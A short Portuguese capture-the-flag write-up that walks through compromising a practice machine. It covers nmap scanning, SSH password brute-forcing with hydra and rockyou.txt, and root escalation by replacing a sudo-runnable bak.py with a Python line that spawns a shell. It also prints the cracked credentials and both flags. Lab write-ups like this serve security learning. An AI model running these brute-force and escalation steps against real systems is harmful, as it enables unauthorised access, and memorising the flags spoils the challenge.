Ao inicar dei o nmap para ver as portas abertas 

    nmap -A -sV IP 

Encontrei as portas 22 e 80

Ao entrar na pagina web fui vizualizar o codigo fonte, assim encontrando o username Meliodas

Ao dar um gobuster encontrei apenas diretorios comuns e dentro do /robots.txt tinha apenas um comentario a rockyou que e um arquivo famoso para quebrar senhas usando hydra

    hydra -l meliodas -P rockyou.txt -t 4 -F -V 10.10.221.178 ssh

Encontrando a senha...

    [22][ssh] host: 10.10.221.178   login: meliodas   password: iloveyou1

Assim...

    username: meliodas
    pass: iloveyou1

ao fazer o connect ssh encontramos a primeira flag "user.txt"

    cat user.txt
    6d488cbb3f111d135722c33cb635f4ec

Dentro do sistema encontrei um arquivo chamado bak.py que nosso user Meliodas poderia executar como root, sendo assim e so acessar o site GTFobins e modificar por um script python

Bom, percebi que nao podiamos alterar o arquivo.py mas podiamos apaga-lo, entao..

    rm -rf bak.py
    echo 'import os;os.system("/bin/sh")' >> bak.py

Assim conseguindo acessando ao root

    cd root
    cat root.txt
    e8c8c6c256c35515d1d344ee0488c617

Finalizando o desafio..

    touch dannydev19.txt

FLAGS

    FLAG 1: 6d488cbb3f111d135722c33cb635f4ec
    FLAG 2: e8c8c6c256c35515d1d344ee0488c617